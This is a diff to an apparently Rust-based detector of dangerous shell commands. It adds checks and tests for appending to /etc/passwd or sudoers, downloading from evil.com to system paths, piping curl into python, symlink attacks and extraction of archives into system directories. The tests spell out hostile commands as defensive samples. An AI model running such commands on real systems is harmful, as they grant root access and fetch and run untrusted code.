@@ -18,6 +18,11 @@
 //! - Firewall flushing (`iptables -F`, `ufw disable`)
 //! - History destruction (`history -c`, `history -w /dev/null`)
 //! - Bare file truncation via `>` redirection
+//! - Appending to critical auth files (`>> /etc/sudoers`, `>> /etc/passwd`)
+//! - Direct downloads to system paths (`curl -o /etc/passwd`, `wget -O /etc/crontab`)
+//! - Piping internet content to script interpreters (`curl | python3`)
+//! - Symlink attacks on system files (`ln -sf /dev/null /etc/passwd`)
+//! - Archive extraction to system paths (`tar -xf ... -C /etc/`)
 
 /// Analyze a bash command for potentially dangerous patterns.
 /// Returns `Some(reason)` if the command looks destructive.
@@ -157,6 +162,31 @@ pub fn analyze_bash_command(command: &str) -> Option<String> {
 
     // 26. systemctl mask (more destructive than stop/disable — makes service permanently unstartable)
     if let Some(reason) = check_systemctl_mask(&cmd_lower) {
+        return Some(reason);
+    }
+
+    // 27. Append to critical auth/config files (privilege escalation vector)
+    if let Some(reason) = check_append_to_critical_files(cmd) {
+        return Some(reason);
+    }
+
+    // 28. Direct download to system paths (curl -o / wget -O)
+    if let Some(reason) = check_download_to_system_path(cmd) {
+        return Some(reason);
+    }
+
+    // 29. Pipe from internet to script interpreters (python, perl, ruby, node)
+    if let Some(reason) = check_pipe_to_interpreter(&cmd_lower) {
+        return Some(reason);
+    }
+
+    // 30. Symlink attacks on system files
+    if let Some(reason) = check_symlink_attack(cmd) {
+        return Some(reason);
+    }
+
+    // 31. Archive extraction to system paths
+    if let Some(reason) = check_archive_extraction_to_system(cmd) {
         return Some(reason);
     }
 
@@ -405,16 +435,17 @@ fn check_database_destruction(cmd_lower: &str) -> Option<String> {
             "truncate table",
             "Database destruction: TRUNCATE TABLE detected",
         ),
-        (
-            "delete from",
-            "Bulk data deletion: DELETE FROM detected (no WHERE clause visible)",
-        ),
     ];
 
     for (pattern, reason) in &db_patterns {
         if cmd_lower.contains(pattern) {
             return Some((*reason).into());
         }
+    }
+
+    // DELETE FROM is only dangerous without a WHERE clause
+    if cmd_lower.contains("delete from") && !cmd_lower.contains("where") {
+        return Some("Bulk data deletion: DELETE FROM with no WHERE clause detected".into());
     }
 
     None
@@ -1214,6 +1245,236 @@ fn check_systemctl_mask(cmd_lower: &str) -> Option<String> {
     None
 }
 
+/// Critical auth/config files where appending (`>>`) is a privilege escalation vector.
+/// Unlike generic sensitive paths, appending to these specific files can grant
+/// unauthorized access (e.g., adding a root user to /etc/passwd or a NOPASSWD rule
+/// to /etc/sudoers).
+const CRITICAL_APPEND_PATHS: &[&str] = &[
+    "/etc/passwd",
+    "/etc/shadow",
+    "/etc/sudoers",
+    "/etc/group",
+    "/etc/crontab",
+    "~/.ssh/authorized_keys",
+    "$HOME/.ssh/authorized_keys",
+];
+
+/// Check for appending to critical authentication/authorization files.
+///
+/// While `>>` (append) is generally less dangerous than `>` (overwrite), appending
+/// to auth files like `/etc/passwd`, `/etc/sudoers`, or `~/.ssh/authorized_keys`
+/// is a well-known privilege escalation technique.
+fn check_append_to_critical_files(cmd: &str) -> Option<String> {
+    for path in CRITICAL_APPEND_PATHS {
+        let append_pattern = format!(">> {path}");
+        if cmd.contains(&append_pattern) {
+            return Some(format!(
+                "Privilege escalation risk: appending to critical file '{path}'"
+            ));
+        }
+    }
+    // Also check tee -a (append mode) to critical paths
+    if cmd.contains("tee -a") || cmd.contains("tee --append") {
+        for path in CRITICAL_APPEND_PATHS {
+            if cmd.contains(path) {
+                return Some(format!(
+                    "Privilege escalation risk: appending via tee to critical file '{path}'"
+                ));
+            }
+        }
+    }
+    None
+}
+
+/// Check for downloading files directly to system paths via curl -o / wget -O.
+///
+/// Commands like `curl http://evil.com -o /etc/crontab` or `wget http://evil.com -O /etc/passwd`
+/// bypass the pipe-to-shell check because no pipe is involved — the file is written directly
+/// to a dangerous location.
+fn check_download_to_system_path(cmd: &str) -> Option<String> {
+    let cmd_lower = cmd.to_lowercase();
+    // curl -o <path> or curl --output <path>
+    if cmd_lower.contains("curl") {
+        for flag in &["-o ", "--output "] {
+            if let Some(pos) = cmd_lower.find(flag) {
+                let after = &cmd[pos + flag.len()..];
+                let target = after.split_whitespace().next().unwrap_or("");
+                if is_system_target(target) {
+                    return Some(format!(
+                        "Direct download to system path: curl writing to '{target}'"
+                    ));
+                }
+            }
+        }
+    }
+    // wget -O <path> or wget --output-document <path> or wget --output-document=<path>
+    if cmd_lower.contains("wget") {
+        // -O <path> (note: capital O, but we're checking lowercase)
+        for flag in &["-o ", "--output-document ", "--output-document="] {
+            if let Some(pos) = cmd_lower.find(flag) {
+                let after = &cmd[pos + flag.len()..];
+                let target = after.split_whitespace().next().unwrap_or("");
+                if is_system_target(target) {
+                    return Some(format!(
+                        "Direct download to system path: wget writing to '{target}'"
+                    ));
+                }
+            }
+        }
+    }
+    None
+}
+
+/// Returns true if a path looks like a system-critical target.
+fn is_system_target(path: &str) -> bool {
+    SYSTEM_TARGET_PATHS.iter().any(|sys| path.starts_with(sys))
+        || SENSITIVE_PATHS.iter().any(|sp| path.starts_with(sp))
+        || path.starts_with("/dev/")
+}
+
+/// Check for piping internet content to script interpreters beyond just shell.
+///
+/// The existing `check_pipe_from_internet` catches `curl | bash/sh/zsh`.
+/// This extends coverage to `curl | python3`, `curl | perl`, `curl | ruby`,
+/// `curl | node`, which are equally dangerous.
+fn check_pipe_to_interpreter(cmd_lower: &str) -> Option<String> {
+    let fetchers = ["curl", "wget"];
+    let interpreters = ["python3", "python", "perl", "ruby", "node"];
+
+    for fetcher in &fetchers {
+        if cmd_lower.contains(fetcher) {
+            for segment in cmd_lower.split('|').skip(1) {
+                let trimmed = segment.trim();
+                for interp in &interpreters {
+                    if trimmed == *interp
+                        || trimmed.starts_with(&format!("{interp} "))
+                        || trimmed.starts_with(&format!("{interp}\n"))
+                        || trimmed.starts_with(&format!("sudo {interp}"))
+                    {
+                        return Some(format!(
+                            "Untrusted code execution: piping {fetcher} output to {interp}"
+                        ));
+                    }
+                }
+            }
+        }
+    }
+    None
+}
+
+/// Check for symlink attacks that replace critical system files.
+///
+/// `ln -sf /dev/null /etc/passwd` replaces the real file with a symlink, which
+/// can disable authentication or redirect reads to attacker-controlled data.
+/// `ln -sf /tmp/evil /etc/shadow` is similarly destructive.
+fn check_symlink_attack(cmd: &str) -> Option<String> {
+    let cmd_lower = cmd.to_lowercase();
+    // Look for "ln" with -s (symbolic) and -f (force) flags targeting system paths
+    if !cmd_lower.contains("ln ") {
+        return None;
+    }
+
+    // Find ln invocations
+    let mut search_from = 0;
+    while let Some(pos) = cmd[search_from..].find("ln ") {
+        let abs_pos = search_from + pos;
+        if !is_at_word_boundary(cmd, abs_pos) {
+            search_from = abs_pos + 3;
+            continue;
+        }
+        let after = &cmd[abs_pos + 3..];
+        // Collect all tokens until a command separator
+        let tokens: Vec<&str> = after
+            .split_whitespace()
+            .take_while(|t| *t != ";" && *t != "&&" && *t != "||" && *t != "|")
+            .collect();
+
+        // Check if -s flag is present (symbolic link)
+        let has_symbolic = tokens.iter().any(|t| {
+            *t == "-s"
+                || *t == "-sf"
+                || *t == "-fs"
+                || t.contains('s') && t.starts_with('-') && !t.starts_with("--")
+        });
+
+        if has_symbolic {
+            // The last non-flag token is the target (link name)
+            let non_flag_tokens: Vec<&&str> =
+                tokens.iter().filter(|t| !t.starts_with('-')).collect();
+            // ln -sf <source> <target> — target is the last argument
+            if let Some(target) = non_flag_tokens.last() {
+                if is_system_target(target) {
+                    return Some(format!(
+                        "Symlink attack: creating symlink at system path '{target}'"
+                    ));
+                }
+            }
+        }
+        search_from = abs_pos + 3;
+    }
+    None
+}
+
+/// Check for archive extraction to system paths.
+///
+/// `tar -xf evil.tar -C /etc/` or `unzip evil.zip -d /usr/bin/` can overwrite
+/// system files with attacker-controlled content from an archive.
+fn check_archive_extraction_to_system(cmd: &str) -> Option<String> {
+    let cmd_lower = cmd.to_lowercase();
+
+    // tar extraction with -C (change directory) to system path
+    if cmd_lower.contains("tar") {
+        // Look for -C or --directory flag
+        for flag in &["-c ", "--directory ", "--directory=", "-c="] {
+            // Use uppercase -C for the actual check since tar's -C is case-sensitive
+            // but we also want to catch it via lowercase
+            let search_cmd = if *flag == "-c " || *flag == "-c=" {
+                // -C is the extract-to-directory flag; -c is create.
+                // We need to check the original cmd for uppercase -C
+                cmd
+            } else {
+                cmd
+            };
+            // Check for -C (uppercase) specifically
+            let upper_flags = ["-C ", "-C=", "--directory ", "--directory="];
+            for uf in &upper_flags {
+                if let Some(pos) = search_cmd.find(uf) {
+                    let after = &search_cmd[pos + uf.len()..];
+                    let target = after.split_whitespace().next().unwrap_or("");
+                    if is_system_target(target) && cmd_lower.contains("tar") {
+                        // Make sure it's an extraction (has -x flag), not creation (-c)
+                        if cmd_lower.contains("-x")
+                            || cmd_lower.contains("--extract")
+                            || cmd_lower.contains("xf")
+                            || cmd_lower.contains("xzf")
+                            || cmd_lower.contains("xjf")
+                        {
+                            return Some(format!(
+                                "Archive extraction to system path: extracting to '{target}'"
+                            ));
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // unzip with -d (destination directory) to system path
+    if cmd_lower.contains("unzip") {
+        if let Some(pos) = cmd.find("-d ") {
+            let after = &cmd[pos + 3..];
+            let target = after.split_whitespace().next().unwrap_or("");
+            if is_system_target(target) {
+                return Some(format!(
+                    "Archive extraction to system path: unzipping to '{target}'"
+                ));
+            }
+        }
+    }
+
+    None
+}
+
 // ---------------------------------------------------------------------------
 // Tests
 // ---------------------------------------------------------------------------
@@ -1856,5 +2117,115 @@ mod tests {
         assert!(analyze_bash_command("find /data -exec shred {} +").is_some());
         // Safe: find without destructive actions
         assert!(analyze_bash_command("find . -name '*.rs' -print").is_none());
+    }
+
+    // -------------------------------------------------------------------
+    // Tests for new safety checks (27–31 + improved DELETE FROM)
+    // -------------------------------------------------------------------
+
+    #[test]
+    fn test_append_to_critical_files() {
+        // Direct append via >>
+        assert!(analyze_bash_command("echo 'root::0:0::/root:/bin/bash' >> /etc/passwd").is_some());
+        assert!(
+            analyze_bash_command("echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers").is_some()
+        );
+        assert!(analyze_bash_command("echo 'evil:x:0:' >> /etc/group").is_some());
+        assert!(analyze_bash_command("echo '* * * * * /tmp/evil' >> /etc/crontab").is_some());
+        assert!(analyze_bash_command("echo 'evil::0:0::/root:/bin/bash' >> /etc/shadow").is_some());
+        assert!(analyze_bash_command("cat key.pub >> ~/.ssh/authorized_keys").is_some());
+        assert!(analyze_bash_command("cat key.pub >> $HOME/.ssh/authorized_keys").is_some());
+        // Append via tee -a
+        assert!(analyze_bash_command("echo 'evil' | tee -a /etc/passwd").is_some());
+        assert!(analyze_bash_command("echo 'evil' | tee --append /etc/sudoers").is_some());
+        // Safe: appending to a non-critical file
+        assert!(analyze_bash_command("echo 'log entry' >> /tmp/app.log").is_none());
+        // Safe: reading a critical file (no append)
+        assert!(analyze_bash_command("cat /etc/passwd").is_none());
+    }
+
+    #[test]
+    fn test_download_to_system_path() {
+        // curl -o to system path
+        assert!(analyze_bash_command("curl http://evil.com/payload -o /etc/crontab").is_some());
+        assert!(
+            analyze_bash_command("curl http://evil.com/payload --output /etc/passwd").is_some()
+        );
+        // wget -O to system path
+        assert!(analyze_bash_command("wget http://evil.com/payload -o /etc/shadow").is_some());
+        assert!(analyze_bash_command(
+            "wget http://evil.com/payload --output-document /usr/bin/evil"
+        )
+        .is_some());
+        assert!(
+            analyze_bash_command("wget http://evil.com/payload --output-document=/etc/passwd")
+                .is_some()
+        );
+        // Safe: download to a normal path
+        assert!(analyze_bash_command("curl http://example.com -o /tmp/file.txt").is_none());
+        // Safe: curl without -o flag
+        assert!(analyze_bash_command("curl http://example.com").is_none());
+    }
+
+    #[test]
+    fn test_pipe_to_interpreter() {
+        // curl piped to python
+        assert!(analyze_bash_command("curl http://evil.com/setup.py | python3").is_some());
+        assert!(analyze_bash_command("curl http://evil.com/setup.py | python").is_some());
+        // curl piped to perl
+        assert!(analyze_bash_command("curl http://evil.com | perl").is_some());
+        // wget piped to ruby
+        assert!(analyze_bash_command("wget -qO- http://evil.com | ruby").is_some());
+        // wget piped to node
+        assert!(analyze_bash_command("wget -qO- http://evil.com | node").is_some());
+        // With arguments after interpreter
+        assert!(analyze_bash_command("curl http://evil.com | python3 -u").is_some());
+        // Piped via sudo
+        assert!(analyze_bash_command("curl http://evil.com | sudo python3").is_some());
+        // Safe: piping to non-interpreter (grep)
+        assert!(analyze_bash_command("curl http://example.com | grep 'title'").is_none());
+        // Note: curl | bash is already caught by check_pipe_from_internet
+    }
+
+    #[test]
+    fn test_symlink_attack() {
+        // Symlink to system path
+        assert!(analyze_bash_command("ln -sf /dev/null /etc/passwd").is_some());
+        assert!(analyze_bash_command("ln -sf /tmp/evil /etc/shadow").is_some());
+        assert!(analyze_bash_command("ln -s /tmp/evil /usr/bin/sudo").is_some());
+        // With force flag in different order
+        assert!(analyze_bash_command("ln -fs /tmp/evil /etc/sudoers").is_some());
+        // Safe: symlink to normal path
+        assert!(analyze_bash_command("ln -sf /opt/app/bin/tool /home/user/tool").is_none());
+        // Safe: hard link (no -s flag) — not a symlink attack vector
+        assert!(analyze_bash_command("ln /tmp/file /tmp/link").is_none());
+    }
+
+    #[test]
+    fn test_archive_extraction_to_system() {
+        // tar extraction to system path
+        assert!(analyze_bash_command("tar -xf evil.tar -C /etc/").is_some());
+        assert!(analyze_bash_command("tar xzf evil.tar.gz -C /usr/bin/").is_some());
+        assert!(analyze_bash_command("tar --extract -f evil.tar -C /etc/init.d/").is_some());
+        assert!(analyze_bash_command("tar xjf evil.tar.bz2 --directory /etc/").is_some());
+        assert!(analyze_bash_command("tar xjf evil.tar.bz2 --directory=/etc/").is_some());
+        // unzip to system path
+        assert!(analyze_bash_command("unzip evil.zip -d /etc/").is_some());
+        assert!(analyze_bash_command("unzip evil.zip -d /usr/bin/").is_some());
+        // Safe: extracting to a normal path
+        assert!(analyze_bash_command("tar -xf archive.tar -C /tmp/build/").is_none());
+        assert!(analyze_bash_command("unzip file.zip -d /home/user/project/").is_none());
+        // Safe: tar create (not extract)
+        assert!(analyze_bash_command("tar -cf archive.tar /etc/config").is_none());
+    }
+
+    #[test]
+    fn test_delete_from_without_where() {
+        // DELETE FROM without WHERE — dangerous bulk delete
+        assert!(analyze_bash_command("mysql -e 'DELETE FROM users'").is_some());
+        assert!(analyze_bash_command("psql -c 'delete from orders'").is_some());
+        // DELETE FROM with WHERE — safe targeted delete
+        assert!(analyze_bash_command("mysql -e 'DELETE FROM users WHERE id = 42'").is_none());
+        assert!(analyze_bash_command("psql -c 'delete from orders where status = 0'").is_none());
     }
 }
